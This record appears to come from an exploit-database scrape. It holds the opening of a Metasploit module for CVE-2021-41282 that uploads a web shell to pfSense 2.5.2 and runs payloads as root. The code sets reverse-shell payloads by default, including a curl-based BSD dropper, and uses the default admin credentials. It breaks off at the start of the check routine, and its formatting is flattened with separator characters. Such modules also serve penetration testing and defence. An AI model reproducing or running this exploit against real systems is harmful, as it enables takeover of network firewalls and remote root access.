{
    "text": "vul_name : pfSense 2.5.2 Shell Upload ， vul_cve : CVE-2021-41282 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， include Msf : Exploit : FileDropper ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'pfSense Diag Routes Web Shell Upload' ,  ， 'Description' => %q{ ， This module exploits an arbitrary file creation vulnerability in the pfSense ， HTTP interface ( CVE-2021-41282 ) . The vulnerability affects versions <= 2.5.2 ， and can be exploited by an authenticated user if they have the ， \"WebCfg - Diagnostics : Routing tables\" privilege. ， This module uses the vulnerability to create a web shell and execute payloads ， with root privileges. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Abdel Adim \"smaury\" Oisfi of Shielder' ,  # vulnerability discovery ， 'jbaines-r7' # metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2021-41282' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2022-02-23' ,  ， 'Platform' => [ 'unix' , 'bsd' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X64 ]  ,  ， 'Privileged' => true ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_openssl' ， } ,  ， 'Payload' => { ， 'Append' => ' & disown' ， } ， } ，  ]  ,  ，  [  ， 'BSD Dropper' ,  ， { ， 'Platform' => 'bsd' ,  ， 'Arch' => [ ARCH_X64 ]  ,  ， 'Type' => : bsd_dropper ,  ， 'CmdStagerFlavor' => [ 'curl' ]  ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'bsd/x64/shell_reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 1 ,  ， 'DefaultOptions' => { ， 'RPORT' => 443 ,  ， 'SSL' => true ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ IOC_IN_LOGS , ARTIFACTS_ON_DISK ]  ， } ， register_options [  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , 'pfsense' ]  )  ,  ， OptString.new ( 'WEBSHELL_NAME' ,  [ false , 'The name of the uploaded webshell. This value is random if left unset' , nil ]  )  ,  ， OptBool.new ( 'DELETE_WEBSHELL' ,  [ true , 'Indicates if the webshell should be deleted or not.' , true ]  )  ，  ]  ，  @ webshell_uri = '/' ，  @ webshell_path = '/usr/local/www/' ， end ，  # Authenticate and attempt to exploit the diag_routes.php upload. Unfortunately ,  ，  # pfsense permissions can be so locked down that we have to try direct exploitation ，  # in order to determine vulnerability. A user can even be restricted from the ，  # dashboard ( where other pfsense modules extract the version ) . ， def check ，  # Grab a CSRF token so that we can log in ， res = send_request_cgi ( 'method' => 'GET' , 'uri' => normalize_uri ( target_uri.path , '/index.php' ) ",
    "time": "2022.03.04"
}